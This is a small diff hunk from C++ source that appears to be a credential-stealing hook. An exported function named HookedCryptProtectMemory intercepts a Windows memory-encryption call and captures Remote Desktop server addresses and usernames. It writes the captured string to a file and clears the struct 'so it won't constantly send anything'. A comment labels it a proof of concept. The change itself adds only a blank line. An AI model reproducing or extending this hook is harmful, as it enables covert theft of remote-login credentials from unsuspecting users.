@@ -92,6 +92,7 @@ __declspec(dllexport) BOOL WINAPI HookedCryptProtectMemory(LPVOID pDataIn, DWORD
 			MessageBoxA(NULL, reinterpret_cast<LPCSTR>(EncryptBuffer->GetEncryptedString()), "Encrypted String", MB_OK);
 			//MessageBox(NULL, lpBuffer.c_str(), L"Just a PoC, not final", MB_OK);
 			WriteToFile(reinterpret_cast<LPCSTR>(EncryptBuffer->GetEncryptedString()));
+
 			// Clean up the struct so it won't constantly send anything
 			RemoteDesktop.lpServerAddress.clear();
 			RemoteDesktop.lpUsername.clear();
